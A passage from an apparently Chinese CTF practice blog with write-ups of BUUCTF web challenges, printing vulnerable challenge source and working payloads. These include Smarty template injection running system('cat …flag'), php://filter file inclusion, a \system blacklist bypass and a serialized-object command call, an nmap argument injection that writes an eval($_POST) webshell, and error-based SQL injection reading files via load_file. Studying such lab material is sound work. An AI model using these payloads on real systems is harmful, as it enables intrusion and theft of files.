<p>smarty中的{if}标签中可以执行php语句，得flag：<code>{if show_source(&#39;/flag&#39;)}{/if}</code>或者<code>{readfile(&#39;/flag&#39;)}</code>在或者直接执行命令<code>{system(&#39;cat ../../../flag&#39;)}</code></p>
</blockquote>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589979833569.png" alt="1589979833569"></p>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589980115733.png" alt="1589980115733"></p>
<p>参考文章：<a href="https://blog.csdn.net/oubasangdadada/article/details/104607777" target="_blank" rel="noopener">https://blog.csdn.net/oubasangdadada/article/details/104607777</a></p>
<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>打开靶机有两个按钮，分别会访问<code>?category=woofers和?category=meowers</code>，并且会随机选取1张图片,考虑到文件包含<br>之后扫描目录发现flag.php,访问<code>?category=flag.php</code>显示<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589982649198.png" alt="1589982649198"></p>
<p>然后在<code>?category=woofers</code>后面随便输入一下字符发现报错<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589982712771.png" alt="1589982712771"></p>
<p>这说明后端会自动将<code>?category=</code>后面的字符串添加一个<code>.php</code>使其变成一个PHP文件<br>现在已经确定是文件包含了，尝试使用PHP伪协议读取文件</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?category=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=meowers</span><br></pre></td></tr></table></figure>

<p>成功读取<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589982867718.png" alt="1589982867718"></p>
<p>在读取flag.php还是会显示<code>Sorry, we currently only support woofers and meowers.</code>先读取index.php</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?category=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index</span><br></pre></td></tr></table></figure>

<p>得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">          <span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看wp后知道php://filter伪协议可以套一层协议。<br>这样只需要嵌套一个符合的flie：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/woofers/resource=flag</span><br></pre></td></tr></table></figure>

<p>得到flag<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1589983726218.png" alt="1589983726218"></p>
<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>打开靶机<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590024556312.png" alt="1590024556312"></p>
<p>没有发现什么可利用的东西，扫描目录也没有什么发现。并且网页每5分钟刷新一次，抓包！<br>发现其结构为<code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code>并且报错<code>date():</code>，猜测执行的函数为<code>date(Y-m-d h:i:s a)</code><br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590024652058.png" alt="1590024652058"></p>
<p>尝试命令执行，输入system，发现被过滤了，尝试一些函数读取文件<br><code>highlight_file</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">func=highlight_file&amp;p=index.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590024873638.png" alt="1590024873638"></p>
<p>发包到浏览器得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">$p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>这里可以使用<code>\system</code>直接绕过，最后在/tmp目录下发现flag<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590026485236.png" alt="1590026485236"></li>
<li>还有一种方法为通过unserialize进行绕过，应为有一个Test类</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">	<span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">			<span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;p = <span class="string">'ls /tmp'</span>;</span><br><span class="line">$a-&gt;func = <span class="string">'system'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//	O:4:"Test":2:&#123;s:1:"p";s:7:"ls /tmp";s:4:"func";s:6:"system";&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590027397673.png" alt="1590027397673"></p>
<h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>本题与<a href="http://cyzcc.vip/2020/04/04/BUU-web%E4%BA%8C/#BUUCTF-2018-Online-Tool">[BUUCTF 2018]Online Tool</a>相似，过滤了php<br>传入<code>&#39; &lt;?=eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code>即可</p>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590034616335.png" alt="1590034616335"></p>
<h1 id="CISCN2019-Web5-CyberPunk"><a href="#CISCN2019-Web5-CyberPunk" class="headerlink" title="[CISCN2019-Web5]CyberPunk"></a>[CISCN2019-Web5]CyberPunk</h1><p>打开靶机之后，查看源码发现提示<code>?file=</code>，应该是文件包含<br>使用PHP伪协议读取源码：<br>change.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"è®¢åä¿®æ¹æå"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æªæ¾å°è®¢å!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html/'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET["file"];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]) ? $_GET[<span class="string">'file'</span>] : <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/phar|zip|bzip2|zlib|data|input|</span></span><br></pre></td></tr></table></figure>

<p>confirm.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">"å·²æäº¤è®¢å"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"è®¢åæäº¤æå"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(<span class="string">'delete from `user` where `user_id`='</span> . $row[<span class="string">"user_id"</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"è®¢åå é¤æå"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æªæ¾å°è®¢å!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>search.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"&lt;p&gt;å§å:"</span>.$row[<span class="string">'user_name'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, çµè¯:"</span>.$row[<span class="string">'phone'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, å°å:"</span>.$row[<span class="string">'address'</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æªæ¾å°è®¢å!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计一遍之后发现在change.php中的address并没有经过$pattern过滤，只用<code>addslashes</code>函数将引号等字符转义，但是在后面发现了<code>old_address</code>，说明修改的地址会被存入数据库中，并且mysql会自动删除转义字符，所以再一次修改地址便会触发上一次的sql语句，即存在二次注入。<br>本题报错之后就必须要重新下单才能在此注入，所以采用报错注入<br>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' and updatexml(1,concat(0x7e,substr(load_file('/flag.txt'),1,20),0x7e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590631597922.png" alt="1590631597922"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1' and updatexml(1,concat(0x7e,substr(load_file('/flag.txt'),20,50),0x7e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>这里通过substr截取来读取flag，看wp说flag在flag.txt中，所以使用sql读取文件</p>
<h1 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h1><p>知识点：<em>SSRF、PHP伪协议包含、逻辑漏洞</em><br>扫目录发现admin.php和home.php，flag.php（在返回包里面有提示，这里直接扫出来了）<br>访问home发现url变为home.php?file=，尝试伪协议读取文件</p>
<blockquote>
<p>php://filter/convert.base64-encode/resource=home</p>
</blockquote>
<p>home.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"y1ng"</span>, sha1(md5(<span class="string">'y1ng'</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">'your_ip_address'</span>, md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\^|\~|&amp;|\|/"</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"forbidden"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/.?f.?l.?a.?g.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/.?a.?d.?m.?i.?n.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"You! are! not! my! admin!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^home$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"禁止套娃"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/home$/i"</span>, $_GET[<span class="string">'file'</span>]) <span class="keyword">or</span> preg_match(<span class="string">"/system$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">'file'</span>].<span class="string">".php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">'file'</span>].<span class="string">".fxxkyou!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"现在访问的是 "</span>.$file . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码限制了file参数只能以home或system结尾，不能包含flag和admin，不能只有home<br>system.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ '</span>;</span><br><span class="line">$str3 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ '</span>;</span><br><span class="line">$str4 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ '</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ````````````````````````````````````````````````````````````````````````````````</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">'/^http:\/\/127\.0\.0\.1\//i'</span>;</span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

